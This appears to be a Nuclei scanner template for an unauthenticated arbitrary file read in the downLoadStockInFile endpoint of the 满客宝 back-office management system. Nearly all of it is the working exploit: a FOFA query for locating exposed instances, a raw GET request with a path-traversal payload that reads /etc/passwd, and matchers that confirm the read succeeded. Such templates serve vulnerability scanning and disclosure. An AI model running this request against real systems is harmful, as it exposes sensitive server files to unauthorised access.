id: mankebao-downLoadStockInFile-File-reading

info:
  name: 满客宝后台管理系统 downLoadStockInFile 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="满客宝后台管理系统"
    满客宝后台管理系统 downLoadStockInFile 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
  reference:
    - https://mp.weixin.qq.com/s/qUBKicrqFaPMr-OjVeFFjg
  tags: File reading

http:
  - raw:
      - |
        GET /warehouse/api/v1/stockIn/downLoadStockInFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0'
      - type: status
        status: 
          - 200